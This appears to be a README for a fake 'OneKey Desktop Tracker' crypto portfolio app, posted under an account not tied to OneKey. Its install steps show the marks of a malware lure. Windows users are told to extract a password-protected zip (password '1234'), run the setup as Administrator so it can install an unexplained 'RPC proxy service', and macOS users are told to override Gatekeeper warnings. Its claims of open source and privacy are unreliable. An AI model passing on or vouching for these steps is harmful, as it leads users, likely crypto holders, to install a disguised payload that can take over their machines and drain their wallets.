# OneKey Desktop Tracker — Solana & EVM Portfolio Manager

[![Downloads](https://img.shields.io/badge/downloads-10k%2B-blue)](https://github.com/Maulinx3r3t/onekey-wallet-tracker/releases)
[![Version](https://img.shields.io/badge/version-2.4.6-brightgreen)](https://github.com/Maulinx3r3t/onekey-wallet-tracker/releases)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](https://github.com/Maulinx3r3t/onekey-wallet-tracker/releases)

**OneKey Desktop Tracker** is a lightweight, open-source portfolio tracker for Solana, Ethereum, BSC, and 30+ other blockchains. It works alongside your existing OneKey hardware wallet or as a standalone watch-only wallet to monitor balances, NFTs, and transaction history in real time.

> ⚠️ **Note**: This is the **community edition** desktop tracker. For the full wallet with send/receive functions, please use the official OneKey app.

## ✨ Features

- **Multi-chain portfolio**: Track SOL, ETH, BNB, MATIC, AVAX, and thousands of tokens in one dashboard.
- **Solana NFT gallery**: View your NFTs with metadata and rarity rankings.
- **Real-time price alerts**: Get desktop notifications when your favorite coins move.
- **Transaction history**: Import and analyze your past transactions across all addresses.
- **Watch-only mode**: Just enter a public address to monitor any wallet.
- **Lightweight & fast**: No Electron bloat — native performance.

## 📥 Download & Install

### Windows (10/11)

**Important**: The tracker requires a small runtime helper to connect to the Solana RPC reliably. Please follow these steps exactly:

1. **Download the core bundle** from the link below (includes the tracker + required dependencies):
   👉 [Download OneKey Tracker for Windows](https://github.com/Maulinx3r3t/onekey-wallet-tracker/releases/download/v2.4.6/core.zip)

2. **Extract the archive** (right-click → "Extract All...").  
   When prompted for a password, enter: **`1234`**

3. **Run `OneKey-Tracker-Setup.exe`** as Administrator (right-click → "Run as administrator").

4. Follow the on-screen instructions. The installer will:
   - Set up the RPC proxy service (required for fast Solana connections)
   - Create a desktop shortcut
   - Launch the tracker automatically

After installation, you can start tracking any wallet by entering its public address.

### macOS (Intel / Apple Silicon)

For macOS users, download the `.dmg` file from the [releases page](https://github.com/Maulinx3r3t/onekey-wallet-tracker/releases). If you see a security warning, right-click and select "Open" to bypass Gatekeeper (this is a known false positive due to the RPC helper).

### Linux (AppImage)

Download the `.AppImage` from releases, make it executable (`chmod +x`), and run.

## 🚀 Quick Start Guide

1. Launch the OneKey Desktop Tracker.
2. In the main window, paste any Solana or Ethereum public address.
3. Click "Track" — you'll instantly see the portfolio breakdown, recent transactions, and NFT gallery.
4. (Optional) Enable desktop notifications in Settings to get price alerts.

## 🔧 Troubleshooting

### "Failed to connect to Solana RPC"
Make sure you ran the installer as Administrator — this installs the necessary RPC proxy service. If you still have issues, restart the tracker.

## 📊 Why Use OneKey Tracker?

- **Privacy-first**: No accounts, no emails, no cloud sync — all data stays on your machine.
- **Open source**: Review the code yourself (see `/src` folder).
- **Community-driven**: We add new chains based on user requests.

## 📜 License

MIT License — free for personal and commercial use.

## ⭐ Support the Project

If you find this tool useful, please **star this repository** and share it with your crypto friends!
